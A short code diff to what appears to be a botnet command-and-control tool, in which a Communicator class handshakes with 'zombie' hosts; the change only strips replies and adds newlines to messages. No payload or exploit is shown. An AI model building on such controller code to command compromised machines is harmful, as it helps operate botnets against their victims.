@@ -40,6 +40,8 @@ class Communicator:
     def send_hello_signal(self):
         hello_signal_msg = 'c2x-hello'
         reply = self.msg_manager(msg=hello_signal_msg, has_reply=True, timeout=1.5)
+        if reply:
+            reply = reply.strip()
         if reply == 'c2x-hello_back':
             print('Zombie {}:{} sent '.format(self.zombie_ip,self.zombie_port) + Fore.GREEN
                   + 'hello_back' + Fore.RESET + '.')
@@ -58,7 +60,7 @@ class Communicator:
 
     def send_msg(self, msg, has_reply=None, timeout=None):
         # if zombie socket is not specified use default one which created by class constructor
-
+        msg += '\n'
         encoded_msg = msg.encode()
         self.zombie_socket.sendall(encoded_msg)
 
